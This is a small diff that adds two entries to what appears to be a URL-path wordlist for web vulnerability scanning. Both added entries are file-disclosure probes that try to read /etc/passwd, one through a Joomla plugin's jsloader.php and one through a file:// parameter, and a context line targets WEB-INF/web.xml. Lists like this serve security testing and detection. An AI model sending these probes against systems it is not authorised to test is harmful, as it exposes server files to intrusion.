@@ -253,3 +253,5 @@
 /user/login
 /wp-json/igd/v1/get-users-data
 /{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
+/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
+/index.php?mod=textviewer&src=file:///etc/passwd
